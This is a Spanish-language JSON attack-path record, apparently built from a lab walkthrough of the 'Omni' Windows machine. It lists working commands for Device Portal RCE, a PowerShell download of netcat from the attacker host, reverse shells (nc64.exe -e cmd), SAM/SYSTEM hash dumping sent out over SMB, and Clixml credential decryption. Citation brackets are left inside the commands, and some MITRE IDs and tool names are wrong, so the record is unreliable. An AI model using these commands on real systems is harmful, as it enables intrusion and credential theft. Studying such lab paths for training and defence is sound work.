@@ -1,0 +1,121 @@
+{
+  "id": "ap-0001",
+  "title": "Escalada de Privilegios en Windows: RCE por Device Portal -> Hash Dumping -> Desencriptación de Clixml",
+  "summary": "Explotación de vulnerabilidad de RCE en el Windows Device Portal (8080) para obtener acceso inicial, extracción de SAM/SYSTEM para volcado de hashes, y desencriptación de credenciales almacenadas usando Import-Clixml.",
+  "attack_path_markdown": "### Paso 1: Reconocimiento y Descubrimiento\nSe identifica el objetivo, su IP (10.10.10.204) y sistema operativo (Windows) [7, 8]. Se realiza un escaneo de puertos TCP completo para identificar puertos abiertos, encontrando, entre otros, el puerto 8080 [22]. Se lanza un escaneo detallado de versiones y servicios en los puertos descubiertos.\n\n### Paso 2: Acceso Inicial y Ejecución Remota de Comandos (RCE)\nSe identifica que el puerto 8080 corre el 'Windows Device Portal' . Tras buscar exploits, se encuentra una herramienta para RCE que permite obtener archivos y ejecutar comandos de forma remota. Se valida la ejecución remota de comandos mediante un ping (ICMP trace) al equipo atacante (10.10.14.8).\n\n### Paso 3: Persistencia y Shell Inicial\nSe utiliza PowerShell a través de la RCE para transferir Netcat (`nc64.exe`) a un directorio con capacidad de escritura (`C:\\Windows\\System32\\spool\\drivers\\color\\`). Posteriormente, se ejecuta Netcat para obtener una reverse shell inicial como el usuario `Omni`.\n\n### Paso 4: Movimiento Lateral y Escalada (Omni -> App)\nSe buscan y copian los archivos SAM y SYSTEM, que contienen los hashes locales de los usuarios, ya que están protegidos mientras están en uso. Estos archivos se transfieren al equipo atacante mediante un recurso compartido SMB. Los hashes se extraen usando `secretsdump.py` y se crackean con fuerza bruta, revelando la contraseña del usuario `App`.\n\n### Paso 5: Escalada de Privilegios (App -> Administrator)\nCon las credenciales del usuario `App`, se inicia sesión en el Device Portal y se obtiene una nueva reverse shell, ahora como `App`. Con los privilegios de `App`, se logra desencriptar el archivo `user.txt` (que estaba en formato Secure String/Clixml) usando `Import-Clixml`. Luego, se encuentra y desencripta el archivo `ioteadmin.xml`, obteniendo la contraseña del usuario `Administrator`.\n\n### Paso 6: Acciones sobre Objetivos (Root)\nSe autentica como `Administrator` en el Device Portal [59] y se obtiene una reverse shell final. Se desencripta el archivo `root.txt` usando `Import-Clixml` para obtener la flag final.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Descubrimiento de la IP objetivo y escaneo de puertos para identificar servicios expuestos, incluyendo el Windows Device Portal en el puerto 8080.",
+      "actions": [
+        "Despliegue y obtención de la IP objetivo (10.10.10.204)",
+        "Verificación del sistema operativo (Windows)",
+        "Escaneo completo de puertos TCP con Nmap",
+        "Escaneo de versiones y servicios en puertos abiertos"
+      ],
+      "tools": ["nmap [10, 15]", "whicHSystem", "git"],
+      "techniques": ["Scanning", "OS Fingerprinting", "Service Discovery"],
+      "mitre_ids": ["T1595.002", "T1046", "T1083"],
+      "indicators": ["IP address: 10.10.10.204", "Puerto 8080 abierto", "Windows Device Portal"],
+      "preconditions": "Conexión de red con el objetivo",
+      "expected_outcome": "Lista de puertos abiertos y servicios clave identificados (8080/Windows Device Portal)",
+      "confidence": 1.0,
+      "commands": [
+        "nmap -p- -T5 --min-rate 5000 --open -v -n -Pn 10.10.10.204 -oG allports",
+        "nmap -sC -sV -p <puertos> -n -oN target 10.10.10.204"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Initial Access",
+      "description": "Explotación del Device Portal para lograr Ejecución Remota de Comandos (RCE) sin autenticación.",
+      "actions": [
+        "Búsqueda y clonación de exploit para Windows Device Portal",
+        "Validación de RCE mediante intento de obtener archivo `/etc/hosts`",
+        "Validación de RCE mediante ICMP (ping) a atacante (10.10.14.8)",
+        "Transferencia de Netcat (`nc64.exe`) a la máquina víctima",
+        "Ejecución de Netcat para obtener una reverse shell inicial"
+      ],
+      "tools": ["aires_rat.py", "python3", "powershell", "nc64.exe"],
+      "techniques": ["Exploitation for Client Execution", "Remote Services", "Ingress Tool Transfer (PowerShell)"],
+      "mitre_ids": ["T1190", "T1071.001", "T1105", "T1560.001"],
+      "indicators": ["Respuesta de ping desde 10.10.10.204", "Conexión de shell en puerto 443"],
+      "preconditions": "Vulnerabilidad activa en el Windows Device Portal (8080) y exploit funcional",
+      "expected_outcome": "Reverse shell obtenida como usuario 'Omni'",
+      "confidence": 1.0,
+      "commands": [
+        "python3 aires_rat.py 10.10.10.204 -g C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "python3 aires_rat.py 10.10.10.204 -c cmd -a \"ping 10.10.14.8\"",
+        "python3 -m http.server 80 [33]",
+        "powershell -c \"Invoke-WebRequest http://10.10.14.8/netcat.64.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\" [34, 35]",
+        "nc -lvnp 443 [35]",
+        "python3 aires_rat.py 10.10.10.204 -c cmd -a \"C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.8 443\""
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Credential Access",
+      "description": "Volcado de hashes del sistema SAM y cracking para obtener credenciales de otros usuarios.",
+      "actions": [
+        "Copia de los archivos SAM y SYSTEM de HKLM",
+        "Configuración de recurso compartido SMB en la máquina atacante (10.10.14.8)",
+        "Transferencia de copias SAM y SYSTEM al atacante vía SMB",
+        "Extracción de hashes de usuarios locales",
+        "Crackeo de hashes NTLM obtenidos para el usuario 'App'"
+      ],
+      "tools": ["reg.exe (rec save) ", "smbserver.py", "net use", "copy", "secretsdump.py [49]", "John/Hashcat (implied)"],
+      "techniques": ["OS Credential Dumping ", "Transferencia por SMB ", "Password Cracking"],
+      "mitre_ids": ["T1003.002", "T1003.003", "T1003.004"],
+      "indicators": ["Hashes NT/LM extraídos", "Contraseña en texto claro para 'App' (m5143)"],
+      "preconditions": "Acceso inicial al sistema (Omni user) y capacidad de ejecución de comandos de registro",
+      "expected_outcome": "Credenciales del usuario 'App' obtenidas",
+      "confidence": 0.95,
+      "commands": [
+        "reg save HKLM\\SYSTEM system_backup ",
+        "reg save HKLM\\SAM sam_backup",
+        "smbserver.py smb_folder . -smb2support ",
+        "net use X: \\\\10.10.14.8\\smb_folder sabitar123 /user:sabitar",
+        "copy system_backup X:\\system ",
+        "copy sam_backup X:\\sam ",
+        "secretsdump.py -sam sam -system system local "
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Privilege Escalation",
+      "description": "Uso de las credenciales de 'App' para desencriptar archivos críticos y obtener la flag de usuario y credenciales de 'Administrator'.",
+      "actions": [
+        "Autenticación en Device Portal con credenciales de 'App' ",
+        "Obtención de reverse shell como usuario 'App' ",
+        "Desencriptación de `user.txt` (Secure String/Clixml) para obtener la flag de usuario ",
+        "Descubrimiento y desencriptación de `ioteadmin.xml` para obtener la contraseña de 'Administrator' ",
+        "Obtención de reverse shell final como 'Administrator' ",
+        "Desencriptación de `root.txt` para obtener la flag de administrador "
+      ],
+      "tools": ["Netcat [54, 60]", "PowerShell (Import-Clixml) "],
+      "techniques": ["Exploitation for Privilege Escalation ", "Stored Data Decryption (Clixml) "],
+      "mitre_ids": ["T1059.003", "T1059.006", "T1537", "T1078"],
+      "indicators": ["Flags de usuario y root obtenidas ", "Credenciales de administrador en texto claro "],
+      "preconditions": "Credenciales de 'App' obtenidas  y shell como 'App' ",
+      "expected_outcome": "Acceso completo al sistema como 'Administrator' y obtención de la flag final ",
+      "confidence": 1.0,
+      "commands": [
+        "C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.8 443 (Ejecutado por Device Portal como App) ",
+        "Import-Clixml user.txt | Get-Credential -Credential <variables> | Select-Object -ExpandProperty password ",
+        "Import-Clixml ioteadmin.xml ",
+        "C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.8 443 (Ejecutado por Device Portal como Administrator) ",
+        "Import-Clixml root.txt | Get-Credential -Credential <variables> | Select-Object -ExpandProperty password "
+      ]
+    }
+  ],
+  "tactics": ["Reconnaissance", "Initial Access", "Credential Access", "Privilege Escalation"],
+  "techniques": ["Remote Code Execution", "OS Credential Dumping", "Password Cracking", "Stored Data Manipulation (Clixml)", "Ingress Tool Transfer"],
+  "mitre_ids": ["T1190", "T1003.003", "T1595.002", "T1059.003", "T1059.006", "T1105"],
+  "hosts": ["10.10.10.204 (Omni) ", "10.10.14.8 (Atacante) "],
+  "privs_obtained": ["domain user (Omni) ", "Application User (App) ", "Administrator "],
+  "confidence": 1.0,
+  "source_file": "Omni",
+  "notes": "Procedimiento de compromiso completo de una máquina Windows. Se utilizó el bypass de AppLocker para la transferencia de herramientas (`C:\\Windows\\System32\\spool\\drivers\\color\\`).",
+  "labels": ["attack_path", "windows", "powershell", "rce", "credential_dumping"]
+}
